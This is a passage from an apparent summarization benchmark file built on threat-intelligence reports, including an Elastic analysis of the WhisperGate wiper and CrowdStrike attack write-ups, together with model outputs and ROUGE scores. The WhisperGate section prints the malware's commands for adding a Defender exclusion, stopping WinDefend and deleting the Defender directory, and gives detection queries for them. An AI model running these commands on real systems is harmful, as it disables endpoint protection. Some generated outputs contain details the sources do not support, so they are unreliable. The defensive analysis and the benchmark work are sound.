0.100.0 beta has been released!SoftwareS N O R T B L O G Snort Subscriber Rule Set Update for 01/16/2018Vulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogBACK Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE-SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareBACK BACKVulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogSnort Vulnerability Reports Email & Web Tra c Reputation AMP Threat Naming Conventions ClamAV CommunityRazorback IP Blacklist Download SpamCopMo owPE-SigImmunetTeslacrypt Decryption ToolMBR FilterFIRSTLockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny FuzzerSoftwareVulnerability InformationReputation CenterLibrarySupport CommunitiesAboutCareersBlogSoftwareReputation CenterVulnerability InformationBACK Email & Web Tra c Reputation Snort CommunityMicrosoft Advisory Snort RulesClamAV AMP Threat Naming Conventions IP Blacklist DownloadAWBO Exercises IP Blacklist Download SpamCopCareersBlogMo owPE-Sig CONNECT WITH US ImmunetTeslacrypt Decryption ToolMBR FilterFIRST\u00a9 2018 Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our Privacy Policy here.LockyDumpFreeSentryFlokibot ToolsSynful Knock ScannerCisco Smart Install ScannerROPMEMUBASSPyREBoxFile2pcapDeceptMutiny Fuzzer ", "generated_text": "threats; the Middle East; Talos; use; VBScript; PowerShell; VBA; capabilities; the attacker; the Middle East; the Middle East; the document; the attacker; malware; the Middle East; the Middle East; China; a targeted attack; detection; the attacker; the infrastructure; time; systems; intelligence; CERT; infrastructure; Analysis; the rst targeted campaign; the Middle East; the name; Dar El-Jaleel; the campaigns; vulnerabilities.", "ref_text": "<START-1>The document describes a targeted attack campaign affecting the Middle East that uses VBScript, PowerShell, and VBA macros to deploy malware. The campaign starts with a VBScript that generates a PowerShell script. The PowerShell script creates a weaponized Office document containing macros. When opened, the macro creates and executes a Windows Script File (WSF). The WSF file contains the main malware functionality, configured to contact a command and control server, oce-update[.]services. It registers the infected system and retrieves additional payloads, which are obfuscated VBScript functions. The payloads include reconnaissance functions to fingerprint the infected system, persistence functions, and a pivot function to download and execute shellcode from another IP address. The attacker exhibits strong operational security, using CloudFlare to hide infrastructure, filtering on user agents, and only enabling C2 servers briefly. Code analysis shows similarities to the Jenxcus/Houdini malware. Decoy documents pretend to be confidential reports from a Jordanian research institute on regional conflicts. This and other clues suggest the campaign targets individuals with interest in Middle East politics and military affairs. Talos provides IOCs, detection coverage, and recommendations like updating software, blocking scripts, using email security, and building threat intelligence. In summary, the report analyzes an advanced, targeted VBScript malware campaign affecting the Middle East region. <END-1>", "t5/keyword/hint_hit_precision": 0.42424242424242425, "t5/word/hint_hit_recall": 0.0966183574879227, "gpt3/lexical/rouge_rouge1": 0.3887147335423198, "gpt3/lexical/rouge_rouge2": 0.10094637223974763, "gpt3/lexical/rouge_rougeL": 0.213166144200627, "gpt3/lexical/rouge_rougeLsum": 0.213166144200627, "gpt3_generated_text": ["The article discusses a targeted attack in the Middle East identified by Talos, involving the use of VBScript, PowerShell, and VBA by the attacker. The attacker camouflages their infrastructure and uses reputable services like CloudFlare to hide their location. Decoy documents from Dar El-Jaleel, a research institute in Jordan, are used to deliver malware. The attacker demonstrates strong operational security and conducts reconnaissance to target specific systems. This campaign is not the first to use Dar El-Jaleel documents, but there is no indication of a connection to previous campaigns. The attacker's capabilities and techniques highlight the need for advanced threat detection and intelligence sharing among organizations."]}, {"split_name": "val", "sample_id": "val_96", "prompt_text": "Extract the keywords: The French Connection: French Aerospace-Focused CVE-2014-0322 Attack Shares Similarities with 2012 Capstone Turbine Activity 25 FEB 2014 THE ADVERSARY LINE-UPMATT DAHLTwo weeks ago, news broke about strategic web compromise (SWC) activity on the website for the U.S. organization, Veterans of Foreign Wars (VFW). This activity leveraged exploit code for a zero-day vulnerability now identi\ufb01ed as CVE-2014-0322 and ultimately infected victims with  ZxShell malware. CrowdStrike Intelligence attributed this attack to the AURORA PANDA adversary; however, the discovery of additional indicators revealed that another adversary was leveraging the same vulnerability to carry out targeted attacks nearly a month before the VFW attack occurred. This other activity appears to be focused on French aerospace and shares similarities with a 2012 SWC campaign affecting the website of U.S.-based turbine manufacturer, Capstone Turbine.GIFAS-Related ActivityCrowdStrike Intelligence became aware of this additional activity after learning of a malicious iframe located at savmpet[.]com. The iframe redirected visitors to gifas[.]assso[.]net, which was hosting exploit code in two \ufb01les (include.html and Tope.swf) as well as a malicious payload  (Erido.jpg).Above are screenshots of the savmpet[.]com webpage and part of the page source showing the date that it was last modi\ufb01ed and the iframe redirect. The content of the page was taken from the  website of the French aerospace industries association, Groupement des industries fran\u00e7aises a\u00e9ronautiques et spatiales (GIFAS). The 17 January 2014 date on both the webpage and the page source shows that it was created nearly a month before the VFW attack occurredVictim exploitation occurred in the same manner as in the VFW activity, but the payload was different. Instead of ZxShell malware connecting to AURORA PANDA-related infrastructure, it was a malware variant known as Sakula connecting to command-and-control (C2) infrastructure at oa[.]ameteksen[.]com.French Aerospace FocusThis attack\u2019s most obvious connection to French aerospace is the content taken from the GIFAS website and the GIFAS-based domain used to host the exploit code and payload gifas[.]assso[.]net. Several other domains were also pointed at this IP during the same time frame, including two that contained the same content and malicious iframe as savmpet[.]com, secure[.]safran-group[.]com, and icbcqsz[.]com.Of particular interest was secure[.]safran-group[.]com. Safran is a France-based aerospace and defense company with a focus on the design and production of aircraft engines and equipment. The company owns the safran-group[.]com domain, and the fact that one of its subdomains was pointed at a malicious IP address suggests that the adversary compromised Safran\u2019s DNS.The Sakula malware used in this attack contained an unusual and interesting component that further indicates a focus on French aerospace. As part of the infection process, it added a number of domains to the \u201chost\u2019s\u201d \ufb01le of victim machines. The snecma[.]fr domain belongs to the Safran subsidiary, Snecma, that designs and builds engines for civilian and military aircraft, and spacecraft. The domains listed appear to provide remote access to the company\u2019s employees and possibly third-party contractors.The purpose of this component is unclear. It does not map these domains to malicious IP meant to send victims directly to adversary infrastructure for credential collection. One possibility is that it was meant to make the malware appear more legitimate. It has also been hypothesized that this was done to ensure DNS connectivity to these particular domains; however, it seems unlikely that victims would suffer signi\ufb01cant DNS connectivity issues, which  means that adding this component to the malware for that purpose would be somewhat super\ufb02uous. It should be noted that no victim logs related to this attack were discovered, so it is unclear who the actual targets and victims were. Having the secure[.]safran-group[.]com domain pointed at a malicious IP indicates that Safran suffered a DNS compromise, but no deeper network compromise was observed. It is possible that the adversary desired to target the French aerospace and defense sectors broadly, or possibly organizations in these sectors globally.Similarities to 2012 Capstone Turbine SWC AttackIn January 2013, it was reported that the website for U.S.-based turbine manufacturer, Capstone Turbine, had been compromised and was being used in a SWC attack leveraging an exploit for the CVE-2012-4792. There are three primary similarities between the Capstone Turbine attack and the recent French aerospace activity.The \ufb01rst, and most signi\ufb01cant, connection is the use of Sakula malware. In both campaigns,   Sakula variants were installed on successfully exploited machines. In Capstone Turbine, the web[.]vipreclod[.]com, and in the recent attack, the sample (MD5 hash: doesn\u2019t appear to be widespread, but it is not yet clear whether only one group uses it, and therefore its use alone does not necessarily indicate a particular adversary.Another similarity is that GIFAS-based malicious domains are related to each incident. In the more recent attack, the gifas[.]assso[.]net domain was used to host exploit code and the malicious payload. The Capstone Turbine incident did not directly use a GIFAS-based domain, but a deeper look at network indicators related to those observed in the Capstone incident reveals two such domains: gifas[.]cechire[.]com and gifas[.]blogsite[.]org.The third similarity between the two is the use of zero-days. The exploit used in Capstone Turbine was a zero-day during the time it was active, just like the exploit used in the recent French aerospace activity. This is a general similarity that does not create a de\ufb01nitive link  between the two attacks, but when viewed in conjunction with the use of the same malware and GIFAS-based domains, it strengthens the connection.\u2190 Mo\u2019 Shells Mo\u2019 Problems \u2013 File List StackingDetails about Apple SSL vulnerability and iOS 7.0.6 patch \u2192Follow Us Tweets about \"from:crowdstrike OR from:Adam_Cyber OR from:JMDeC OR from:DmitriCyber OR from:StevenChabinsky OR from:George_Kurtz\"Recent PostsThe Imperative for Proactive Incident Response in 2015 and Beyond November 3, 2015Why Your Business Environment Should Drive Cybersecurity November 2, 2015Blurring of Commodity and Targeted Attack Malware October 16, 2015Should I Really Trust the Cloud with my Endpoint Protection? September 30, 2015U.S. \u2013 China Agreement on Cyber Intrusions: An In\ufb02ection Point  September 25, 2015ArchivesM29162330\u00ab OctN O V E M B E RT3101724T5121926F6132027W41118252S7142128015S 18152229Recent Comments ", "generated_text": "activity; Veterans of Foreign Wars; the website; the U.S.; VFW; a zero-day vulnerability; CVE-2014-0322; ZxShell malware; a malware variant; Sakula; command; control; domains; domains; victims; the attackers; the French aerospace industry; French aerospace; the malware; scale; infrastructure; reconnaissance; reconnaissance; detection; victim logs; the French Connection; this attack; a July 2013 SWC campaign; Capstone Turbine; the same vulnerability; the VFW attack; a malicious iframe; savmpet[.]com; the iframe redirects; the malware; a malicious iframe; a malicious payload; Erido; an unusual and interesting component; a focus; French aerospace.", "ref_text": "<START-1>The document analyzes a cyberespionage campaign targeting the French aerospace industry in early 2014. The attackers exploited the CVE-2014-0322 vulnerability using a strategic web compromise to infect victims with Sakula malware. The malware and infrastructure showed connections to French aerospace companies like Safran. The attackers compromised a Safran subdomain and DNS records. The Sakula malware also modified hosts files to include internal Snecma domains. This attack shares tactics, techniques, and procedures with a 2012 campaign that compromised the website of US turbine manufacturer Capstone Turbine. Both used the Sakula malware, exploited zero-days, and involved domains referencing the French aerospace association GIFAS. While the victims are unknown, the indicators point to a focused campaign against French aerospace entities potentially for cyberespionage. The report highlights the importance of securing public-facing websites and DNS infrastructure against state-sponsored threats. Proactive monitoring for strategic web compromises and malware is recommended. <END-1>", "t5/keyword/hint_hit_precision": 0.2926829268292683, "t5/word/hint_hit_recall": 0.14482758620689656, "gpt3/lexical/rouge_rouge1": 0.5602836879432624, "gpt3/lexical/rouge_rouge2": 0.1785714285714286, "gpt3/lexical/rouge_rougeL": 0.24822695035460993, "gpt3/lexical/rouge_rougeLsum": 0.24822695035460993, "gpt3_generated_text": ["The article discusses a strategic web compromise (SWC) attack on the Veterans of Foreign Wars (VFW) website in the U.S. using a zero-day vulnerability, CVE-2014-0322, and ZxShell malware. Another similar attack targeted the French aerospace industry, sharing similarities with a 2012 campaign on Capstone Turbine. The attackers compromised domains related to Safran, a French aerospace company, and used Sakula malware to establish command and control connections. The malware included a component adding domains like snecma[.]fr, suggesting a focus on French aerospace. The purpose of this component remains unclear, and no victim logs were found, indicating a broad targeting of the aerospace and defense sectors. The attack shows a connection to the 2012 Capstone Turbine activity and highlights the ongoing threat to critical industries from sophisticated cyber adversaries."]}, {"split_name": "val", "sample_id": "val_97", "prompt_text": "Extract the keywords: Operation Bleeding Bearelastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/articleBleeding Bear Destructive Ransomware2022-01-19Key Takeaways\u00b6Elastic Security provides new analysis and insights into targeted campaign against Ukraine organizations with destructive malware reported over the weekend of Jan 15, 2022 Techniques observed include process hollowing, tampering with Windows Defender, using a Master Boot Record (MBR) wiper, and file corruptor component Elastic Security prevents each stage of the described campaign using prebuilt endpoint protection features1/13Overview\u00b6 Over this past weekend (1/15/2022), Microsoft released details of a new campaign targeting Ukrainian government entities and organizations with destructive malware. In a multi-staged attack, one malware component known as WhisperGate utilizes a wiping capability on the Master Boot Record (MBR), making any machine impacted inoperable after boot-up.Within another stage, a file infector component is used to corrupt files in specific directories with specific file extensions. The elements used in this campaign lack the common characteristics of a ransomware compromise \u2014 in this case the adversary uses the same Bitcoin address for each victim and offers no sign of intent to help decrypt the victim\u2019s machine.2/13Translation: Update information on the cyber attack on January 13-14 on Ukrainian infrastructure. For a coordinated response report the incident: report@ncscc.gov.uaElastic users are fully protected from attacks like these through our advanced malware detection and Ransomware Protection capabilities in the platform, and the Elastic Security team continues to monitor these events. This case highlights the importance of prevention when it\u2019s up against ransomware and malware with destructive capabilities.Malware analysis breakdown (Stages 1-4)\u00b6Stage 1: WhisperGate MBR payload\u00b6 The Master Boot Record (MBR) is software that executes stored start-up information and, most importantly, informs the system of the location of the bootable partition on disk that contains the user's operating system. If tampered with, this can result in the system being inoperable \u2014 a common tactic for malware and ransomware campaigns over the years to interrupt operation of the infected system.The stage 1 binary is named stage1.exe and has low complexity. A 8192 byte buffer containing the new MBR data that includes the ransom note is allocated on the stack. A file handle is retrieved from CreateFileW pointing to the first physical drive which represents the MBR. That file handle is then called by WriteFile which takes only 512 bytes from the buffer writing over the Master Boot Record.3/13The host will subsequently be rendered inoperable during the next boot-up sequence. Below is a screenshot showing the ransom note from an affected virtual machine.Contained within the ransom note are instructions soliciting payment to a bitcoin wallet address of 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv. The wallet does not appear to have received funds from victims as of the publication of this post.4/13Stage 2/3: Discord downloader and injector\u00b6Once the payload has gained a foothold, further destructive capabilities are facilitated by the stage 2 binary, called stage2.exe . This binary pulls down and launches a payload hosted via the Discord content delivery network, a recently reported approach which is increasingly being used by malicious actors.The obfuscated .NET payload (described as Stage 3 below) is then executed in memory, setting off a number of events including:5/13Writing and executing a VBS script that uses PowerShell to add a Windows Defender exclusion on the root directory (C:)Writing and executing a VBS script\"C:\\Windows\\System32\\WScript.exe\"\"C:\\Users\\jim\\AppData\\Local\\Temp\\Nmddfrqqrbyjeygggda.vbs\"Uses PowerShell to add a Windows Defender exclusionpowershell.exe Set-MpPreference -ExclusionPath 'C:\\'AdvancedRun, a program used to run Windows applications with different settings, is then dropped to disk and executed in order to launch the Service Control Manager and stop the Windows Defender service (WinDefend).AdvancedRun is used to stop Windows Defender\"C:\\Users\\jim\\AppData\\Local\\Temp\\AdvancedRun.exe\" /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /RunAdvancedRun is used again when launching PowerShell to recursively delete the Windows Defender directory and its files.AdvancedRun deleting the Windows Defender directory\"C:\\Users\\jim\\AppData\\Local\\Temp\\AdvancedRun.exe\" /EXEFilename \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"rmdir 'C:\\ProgramData\\Microsoft\\Windows Defender' -Recurse\" /StartDirectory \"\" /RunAs 8 /RunCopies InstallUtil.exe is a command-line utility that allows users to install and uninstall server resources from the local machine into the user\u2019s %TEMP% directory. This action leverages the file for process hollowing by launching it in a suspended state.6/13It then proceeds to allocate memory ( VirtualAllocEx ), write the file corruptor payload (described as the Final Stage below) into memory ( WriteProcessMemory ), modify the thread entry point ( SetThreadContext ) to point to the file corruptor entry point, and start execution of the file corruptor ( ResumeThread ).Final stage: File corruptor\u00b6The final file corruptor payload is loaded in memory via process hollowing to the InstallUtil process. The file corruptor:7/13Targets any local hard drives, attached USB drives, or mounted network shares Scans directories for files matching internal hard-coded extension list (excluding the Windows folder).3DM .3DS .602 .7Z .ACCDB .AI .ARC .ASC .ASM .ASP .ASPX .BACKUP .BAK .BAT .BMP .BRD .BZ .BZ2 .C .CGM .CLASS .CMD .CONFIG .CPP .CRT .CS .CSR .CSV .DB .DBF .DCH .DER .DIF .DIP .DJVU.SH .DOC .DOCB .DOCM .DOCX .DOT .DOTM .DOTX .DWG .EDB .EML .FRM .GIF .GO .GZ .H .HDD .HTM .HTML .HWP .IBD .INC .INI .ISO .JAR .JAVA .JPEG .JPG .JS .JSP .KDBX .KEY .LAY .LAY6 .LDF .LOG .MAX .MDB .MDF .MML .MSG .MYD .MYI .NEF .NVRAM .ODB .ODG .ODP .ODS .ODT .OGG .ONETOC2 .OST .OTG .OTP .OTS .OTT .P12 .PAQ .PAS .PDF .PEM .PFX .PHP .PHP3 .PHP4 .PHP5 .PHP6 .PHP7 .PHPS .PHTML .PL .PNG .POT .POTM .POTX .PPAM .PPK .PPS .PPSM .PPSX .PPT .PPTM .PPTX .PS1 .PSD .PST .PY .RAR .RAW .RB .RTF .SAV .SCH .SHTML .SLDM .SLDX .SLK .SLN .SNT .SQ3 .SQL .SQLITE3 .SQLITEDB .STC .STD .STI .STW .SUO .SVG .SXC .SXD .SXI .SXM .SXW .TAR .TBK .TGZ .TIF .TIFF .TXT .UOP .UOT .VB .VBS .VCD .VDI .VHD .VMDK .VMEM .VMSD .VMSN .VMSS .VMTM .VMTX .VMX .VMXF .VSD .VSDX .VSWP .WAR .WB2 .WK1 .WKS .XHTML .XLC .XLM .XLS .XLSB .XLSM .XLSX .XLT .XLTM .XLTX .XLW .YML .ZIPOverwrites the start of each targeted file with 1MB of static data (byte 0xCC ), regardless of file size Renames each targeted file to a randomized extension Changes to the MBR are particularly strong signals of anomalous and destructive activity typically associated with ransomware. To counteract this, Elastic security researchers built an MBR protection component based around these signals into our multi-layered ransomware protection feature.8/13When a process attempts to overwrite the contents of the MBR, the prewrite buffer and other associated process metadata will be analyzed inline before any changes are written to disk. If the activity is deemed malicious in nature, the process will either be terminated immediately (prevention mode) and / or an appropriate ransomware alert will be generated (prevention and detection modes) to allow security operators time to respond.When configured in prevention mode, Elastic Security\u2019s ransomware protection ensures that the integrity of the MBR is fully preserved, with no changes ever reaching disk thanks to the synchronous framework leveraged by the feature \u2014 effectively preventing the ransomware attack in their tracks as the offending process is terminated.When WriteFile is invoked on PhysicalDrive0 on a host running Elastic Security with ransomware protection enabled, the pending change will immediately be analyzed and deemed malicious. Afterwards, the process will be terminated, the endpoint user will be alerted via a popup notification, and a ransomware prevention alert will be sent to and stored in Elasticsearch. The intended ransom note can be easily deciphered after Base64 decoding the contents of the prewrite buffer found in the alert within Kibana.It is important to note that while this behaviour is detected by Elastic, it is not specific to this payload and rather the behaviour the payload is exhibiting. This increases our chance of being able to detect and prevent malicious behaviors, even when a static signature of the malware is not known. Threat actors find this kind of control more difficult to evade than traditional, signature-based detection and prevention approaches.Observing WhisperGate in Elastic Security\u00b69/13By observing the process hash of the stage 1 dropper above function within Elastic Security, we can isolate the ransomware alert and analyze the blocked attempt at overwriting the MBR.10/13As we can see, the data is stored as a Base64 encoded string in Elasticsearch. Decoded, we can see the contents of the ransom note that would be displayed to the end user of an affected system.Alert breakdown and defensive recommendations\u00b6 The following alerts were triggered in Elastic Security during our investigations:Endpoint Security Integration Alerts\u00b6 ( 34CA75A8C190F20B8A7596AFEB255F2228CB2467BD210B2637965B61AC7EA907 ))Ransomware Prevention Alert (canary files) Malicious Behaviour Prevention Alert - Binary Masquerading via Untrusted Path Memory Threat Prevention AlertPrebuilt Detection Engine Alerts\u00b6 The following existing public detection rules can also be used to detect some of the employed techniques:11/13Hunting queries\u00b6 Detect attempt to tamper with Windows defender settings via NirSoft AdvancedRun executed by the Stage 3 injector:Detect attempts to tamper with Windows Defenderprocess where event.type == \"start\" and Process.pe.original_file_name == \"AdvancedRun.exe\" and process.command_line :(\"*rmdir*Windows Defender*Recurse*\", \"*stop WinDefend*\")Masquerade as InstallUtil via code injection :Identifies code injection with InstallUtilprocess where event.type == \"start\" and process.pe.original_file_name == \"InstallUtil.exe\" and not process.executable : \"?:\\\\Windows\\\\Microsoft.NET\\\\*\"MITRE ATT&CK\u00b6Summary\u00b6 These targeted attacks on Ukraine using destructive malware match a similar pattern observed in the past such as NotPetya. By leveraging different malware components to wipe machines and corrupt files, it\u2019s apparent there was no intent to recover any funds, but likely a technique used to sow chaos and doubt into Ukraine\u2019s stability.As these events are still ongoing, we wanted to release some initial analysis and observations from our perspective. We also wanted to highlight the prevention capabilities of Elastic Security across each stage of this attack, available to everyone today.Existing Elastic Security users can access these capabilities within the product. If you\u2019re new to Elastic Security, take a look at our Quick Start guides (bite-sized training videos to get you started quickly) or our original)SHA256 Stage3(Injector - fixed)SHA256 Stage4 (FileCorruptor)Last update: January 19, 2022 Created: January 19, 202213/13 ", "generated_text": "the report; Operation Bleeding Bear; Ukraine; organizations; Jan; 2022; a malicious malware component; WhisperGate; a wiper; the Master Boot Record; the system; the bootable partition; disk; a file infector component; files; specific directories; the elements; a ransomware compromise; this case; the adversary; the same Bitcoin address; each victim; no sign; intent; decrypt; the victim; The malware; tools; endpoint protection; detection; detection capabilities; vulnerabilities; prevention; sandboxing; tampering; Windows Defender; detection; endpoint detection; threat intelligence.", "ref_text": "<START-1>Here is a summary of the key points from the PDF document: The document analyzes a new destructive malware campaign called Operation Bleeding Bear targeting organizations in Ukraine. The multi-stage attack involves an initial MBR wiper payload to make systems inoperable, followed by a file infector to corrupt specific file types. The first stage MBR wiper overwrites the master boot record, displaying a ransom note on reboot though no decryption is offered. The second stage uses a Discord downloader to retrieve the main payload which tampers with Windows Defender through scripts and process hollowing. The final payload leverages process hollowing to load a file corrupter that overwrites, renames, and deletes targeted file types on local and networked drives. The goal appears to be destroying data rather than obtaining ransom. Elastic Security is able to prevent each stage of the attack using memory threat prevention, malware prevention, and ransomware prevention capabilities. Queries and detection rules are provided to identify the malicious behaviors. The campaign matches past destructive attacks like NotPetya that aim to destabilize and sow chaos rather than financial gain. The analysis provides insight into the adversary's techniques and how Elastic Security can mitigate similar threats. <END-1>", "t5/keyword/hint_hit_precision": 0.23076923076923078, "t5/word/hint_hit_recall": 0.08163265306122448, "gpt3/lexical/rouge_rouge1": 0.44785276073619623, "gpt3/lexical/rouge_rouge2": 0.1419753086419753, "gpt3/lexical/rouge_rougeL": 0.21472392638036808, "gpt3/lexical/rouge_rougeLsum": 0.21472392638036808, "gpt3_generated_text": ["The report details Operation Bleeding Bear, a targeted campaign against Ukrainian organizations in January 2022 using a malicious malware component called WhisperGate. This destructive malware includes a wiper that targets the Master Boot Record, rendering affected systems inoperable. Additionally, a file infector component corrupts files in specific directories. Unlike typical ransomware attacks, the adversary uses the same Bitcoin address for each victim without offering decryption assistance. Elastic Security's endpoint protection features prevent each stage of the attack, highlighting the importance of prevention against ransomware and malware with destructive capabilities. The malware employs techniques such as process hollowing, tampering with Windows Defender, and utilizing a file corruptor component. The report emphasizes the need for advanced malware detection, ransomware protection, and threat intelligence to defend against evolving cyber threats."]}, {"split_name": "val", "sample_id": "val_98", "prompt_text": "Extract the keywords: PANDAS AND BEARSIncident response and security breach investigations experienceVice President, CrowdStrike Services Managing Director, Mandiant Special Agent, Air Force Office of Special InvestigationsLINKEDIN: Wendi WhitmoreTWITTER: @WendiLou2wwhitmor@us.ibm.comPARTNER, IBM SECURITY SERVICESConducting security assessment, incident response, insider threat analysis, and security architecture.Defended networks for the Defense Industrial BaseLINKEDIN: Christopher ScottTWITTER: @NetOpsGuruchris@crowdstrike.comDIRECTOR OF REMEDIATIONComment Panda: Commercial, Government, Non-profitDeep Panda: Financial, Technology, Non-profitFoxy Panda: Technology & CommunicationsAnchor Panda: Government organizations, Defense & Aerospace, Industrial Engineering, NGOsImpersonating Panda: Financial SectorKarma Panda: Dissident groupsKeyhole Panda: Electronics & CommunicationsPoisonous Panda: Energy Technology, G20, NGOs, Dissident GroupsPutter Panda: Governmental & MilitaryToxic Panda: Dissident GroupsUnion Panda: Industrial companiesVixen Panda: GovernmentSinging Spider: Commercial, FinancialUnion Spider: ManufacturingAndromeda Spider: NumerousEnergetic Bear: Oil and Gas CompaniesMagic Kitten: DissidentsCutting Kitten: Energy CompaniesViceroy Tiger: Government, Legal, Financial, Media, TelecomSilent Chollima: Government, Military, FinancialDeadeye Jackal: Commercial, Financial,Media, Social NetworkingGhost Jackal: Commercial, Energy,FinancialCorsair Jackal: Commercial, Technology,Financial, EnergyExtreme Jackal: Military, GovernmentRemove affected machine from network immediatelyCollect data from one machine at a timeTrack attackers and actively hunt for them in real-timeSearch for indicators of attackBegin posturing for remediation on Day 1 of IRContain the adversary quicklyLong Long AgoNot So Long AgoTodayAutomation!Search for indicators of compromiseClean entire network before beginning to remediateConduct forensics for months before containment of the adversary6IOCsMALWARESIGNATURESIOCsEXPLOITSVSIOAsPROCESS FLOWACTION VS MALWARE LATERAL MOVEMENTIOAsVULNERABILITIESIP ADDRESSESWe need a shift in detection capabilities from indicators of compromise toIndicators of AttackForces attackers to change behaviorsNot all behaviors change - good intel and pattern analysis can identify the new TTPsAnalysts need the ability to tailor intel and extract relevance via tools and skillsetsUnderstanding your adversaries helps you gain focus and understand what intel is relevant12TTPs are now rapidly changingSome things must still remainWhat are adversaries adjusting to?Better intelligenceHiding from forensicsBetter analystsBetter technologyHow many adversaries are attacking you?BEARPANDASuccessful spear-phish inJan 2015Complete set of tools for lateral movement copied to network and executedAttackers identified as \u201cliving off the land\u201d and largely using tools readily available on the systemForensic analysis identifieslateral movement and malware created BEFORE spear-phishToolset attributed to China; use went back several years, but recently inactiveTTPs point to Russia; earliest activity occurred Jan 2015Two attacker profiles emergeToolset #1: - Sloppy coding - Compile time and debug info intact - Chinese character set information present Attribution: Eloquent PandaToolset #2: - Professional and sanitized code - Use of valid digital signatures - Attempts to frustrate reverse engineering Attribution: Cozy BearComplete set of tools for lateral movement copied to network and executedAttackers identified as \u201cliving off the land\u201d largely using tools readily available on the systemToolset attributed to China; use went back several years, but recently inactiveTTPs point to Russia; earliest activity occurred Jan 2015Toolset #1: - Sloppy coding - Compile time and debug info intact - Chinese character set information present Attribution: Eloquent PandaToolset #2: - Professional and sanitized code - Use of valid digital signatures - Attempts to frustrate reverse engineering Attribution: Cozy BearMultiple Adversaries?Multiple Locations \u2013 Franchise ExpansionDifferent POS Software and VendorsDifferent Support VendorsDifferent Concerns on SecurityHunting and RespondingUnderstand the EnvironmentDo You Have Access to the Endpoint?This is not a technical question ;-)Do You Have Tools to Respond?This is a technical questionMultiple Adversaries?Plans to purchaseWhat adversaries would be interested?Understand the negotiation plansHunting and RespondingDo you have access in multiple environments?Law firm?Other company?Targeted hunting on people key to the M & A\u2026and their assistants\u2022 Why would you care?\u2013 Understand who is targeting your intellectual property\u2013 Plan to spend your security budget better\u2013 Employ more effective containment and mitigation strategies\u2022 What areas of the kill chain is the adversary targeting?\u2022 Where is the weakness?\u2022 What would better help you identify?\u2013 Context of the incident\u2022 M & A, Franchises, Development Plans\u2013 Malware tools used\u2013 Sequencing of commands\u2013 Known C2 channels\u2022 Why?\u2013 Intellectual property leaving the building during the attack\u2013 What makes you unique is quickly being taken\u2013 Containment is not \u201cRemediation\u201d\u2022 How?\u2013 Visibility, Visibility, Visibility\u2013 Isolate in real time\u2013 New technologies allow for this\u2013 Look at the IOAs\u2022 Where in the attack cycle?\u2022 When?\u2013 As soon as possible\u2013 Before forensics is complete? YES. Are you crazy? No.22THE TAKEAWAYSNot every adversary group is created equal. Groups have differing skills, resources, and capabilities.Do not fit data into your expectations \u2013 Look for anomalies in your findings focusing on timing, behavior, and tradecraftThe likelihood of being targeted by multiple adversaries is high. In this example, remediation had to include both actors simultaneously!\u2022 All Adversaries\u2013 Privileged Account Control\u2022 Think outside of the box on ways to do this\u2013 Blacklisting known IOCs?\u2022 What is the effort vs the reward?\u2013 Service Accounts\u2022 Can you reset them?\u2022 Who has the source code?\u2022 How long to fix it?\u2022 Where is the adversary in the kill chain?\u2022 The earlier in the kill chain, the more options at your disposal.\u2013 Visibility, Visibility, Visibilty\u2013 If you can find them at: exploitation, installation, command and control\u2022 You can stop them quickly\u2013 If you understand the pattern of the attack you have additional options\u2022 Anticipate the next move\u2022 Use the intel you collected26 ", "generated_text": "IBM; CrowdStrike; incidents; defense; industrial; Panda; Bears; intelligence; detection capabilities; indicators; compromise; lateral movement; malware; SHA; a new generation; detection; forensics; information; techniques; patterns; indicators; detection; different adversaries; the same time; security architecture; these new TTPs.", "ref_text": "<START-1>The PDF discusses tactics, techniques, and procedures (TTPs) used by various Chinese and Russian cyber threat actors to compromise networks, as well as recommendations for defending against and responding to such intrusions. It provides an overview of different Chinese threat actor groups, their targeting sectors, and group names - for example, Deep Panda targets financial, technology, and non-profit organizations. It also covers Russian groups like Energetic Bear which targets oil/gas companies. The document emphasizes the importance of shifting detection from indicators of compromise (IOCs) like IP addresses to indicators of attack (IOAs) like malicious behaviors and process flows. IOAs are more effective since attacker TTPs are rapidly changing while some core behaviors remain constant. Understanding your adversaries helps focus intelligence gathering and analysis. A case study highlights how multiple adversary groups can concurrently compromise a network. Forensic analysis revealed two separate toolsets, attributed to Elegant Panda and Cozy Bear. The need for visibility, rapid containment, and assuming multiple adversaries are present is emphasized. Key mitigation takeaways include controlling privileged accounts, resetting service accounts, blacklisting IOCs selectively, and striving to detect intruders early in the attack chain via visibility and behavioral analytics. The earlier an intruder is detected, the more options a defender has to respond and contain the threat. <END-1>", "t5/keyword/hint_hit_precision": 0.23076923076923078, "t5/word/hint_hit_recall": 0.028708133971291867, "gpt3/lexical/rouge_rouge1": 0.46511627906976744, "gpt3/lexical/rouge_rouge2": 0.13450292397660818, "gpt3/lexical/rouge_rougeL": 0.23837209302325582, "gpt3/lexical/rouge_rougeLsum": 0.23837209302325582, "gpt3_generated_text": ["The article discusses incident response and security breach investigations experiences from professionals at IBM Security Services and CrowdStrike. It delves into the various types of adversaries such as Pandas and Bears, each targeting different industries and organizations. The focus is on the shift in detection capabilities from indicators of compromise to indicators of attack, forcing attackers to change their behaviors. The importance of understanding adversary tactics, techniques, and procedures (TTPs) is highlighted, as well as the need for intelligence, pattern analysis, and advanced technology to combat cyber threats. The article emphasizes the importance of conducting thorough forensics, tracking attackers in real-time, and containing the adversary quickly. It also touches on the concept of multiple adversaries attacking an organization simultaneously and the need for tailored intelligence and response strategies to combat these new TTPs."]}, {"split_name": "val", "sample_id": "val_99", "prompt_text": "Extract the keywords: March 2019 during threat hunting. Our specialists collected multiple samples of malware used by the group. They have also identified the organizations hit by the attackers, as well as the attackers' C2 servers.Our data 